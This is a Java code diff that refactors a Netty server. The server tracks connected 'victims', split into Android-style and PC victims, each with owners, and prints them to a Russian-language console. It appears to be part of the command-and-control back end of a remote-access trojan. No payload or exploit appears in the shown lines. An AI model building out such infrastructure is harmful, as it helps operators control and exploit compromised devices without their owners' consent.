@@ -19,13 +19,13 @@ public class NettyServer {
     private DBManager dbManager;
     private Scanner in;
     private HashMap<ChannelId, User> users;
-    private HashMap<ChannelId, Victim> victims;
+    private HashMap<ChannelId, AVictim> aVictims;
     private HashMap<ChannelId, PCVictim> pcVictims;
 
     private NettyServer(int port) {
         this.port = port;
         this.users = new HashMap<>();
-        this.victims = new HashMap<>();
+        this.aVictims = new HashMap<>();
         this.pcVictims = new HashMap<>();
     }
 
@@ -83,15 +83,15 @@ public class NettyServer {
         }
     }
 
-    private void printVictims() {
-        if (victims.size() == 0) {
+    private void printAVictims() {
+        if (aVictims.size() == 0) {
             System.out.println("Нет жертв онлайн!");
             return;
         }
         System.out.println("Жертвы:");
-        for (Map.Entry<ChannelId, Victim> entry : victims.entrySet()) {
-            Victim victim = entry.getValue();
-            System.out.println(victim.getName() + " owners: " + victim.getOwners() + " id: " + entry.getKey());
+        for (Map.Entry<ChannelId, AVictim> entry : aVictims.entrySet()) {
+            AVictim AVictim = entry.getValue();
+            System.out.println(AVictim.getName() + " owners: " + AVictim.getOwners() + " id: " + entry.getKey());
         }
     }
 
@@ -115,14 +115,14 @@ public class NettyServer {
         System.out.println("Пользователи:");
         for (Map.Entry<ChannelId, User> entry : users.entrySet()) {
             User user = entry.getValue();
-            System.out.println(user.getLogin() + " victims: " + user.getVictims() + " id: " + entry.getKey());
+            System.out.println(user.getLogin() + " aVictims: " + user.getVictims() + " id: " + entry.getKey());
         }
     }
 
     private void receiveInputConsole(String[] params) {
         switch (params[0]) {
-            case "victims":
-                printVictims();
+            case "avictims":
+                printAVictims();
                 break;
             case "pcvictims":
                 printPCVictims();
@@ -132,7 +132,7 @@ public class NettyServer {
                 break;
             case "all":
                 printUsers();
-                printVictims();
+                printAVictims();
                 printPCVictims();
                 break;
             default:
@@ -161,16 +161,24 @@ public class NettyServer {
         return users;
     }
 
-    HashMap<ChannelId, Victim> getVictims() {
-        return victims;
+    HashMap<ChannelId, AVictim> getAVictims() {
+        return aVictims;
     }
 
     HashMap<ChannelId, PCVictim> getPcVictims() {
         return pcVictims;
     }
 
-    Victim getVictimByName(String name) {
-        for (Map.Entry<ChannelId, Victim> entry : victims.entrySet()) {
+    HashMap<ChannelId, Victim> getAllVictims() {
+        HashMap<ChannelId, Victim> allVictims = new HashMap<>();
+        allVictims.putAll(aVictims);
+        allVictims.putAll(pcVictims);
+
+        return allVictims;
+    }
+
+    AVictim getAVictimByName(String name) {
+        for (Map.Entry<ChannelId, AVictim> entry : aVictims.entrySet()) {
             if (entry.getValue().getName().equals(name)) return entry.getValue();
         }
         return null;
@@ -180,6 +188,18 @@ public class NettyServer {
         for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
             if (entry.getValue().getName().equals(name)) return entry.getValue();
         }
+        return null;
+    }
+
+    Victim getVictimByName(String name) {
+        for (Map.Entry<ChannelId, AVictim> entry : aVictims.entrySet()) {
+            if (entry.getValue().getName().equals(name)) return entry.getValue();
+        }
+
+        for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
+            if (entry.getValue().getName().equals(name)) return entry.getValue();
+        }
+
         return null;
     }
 
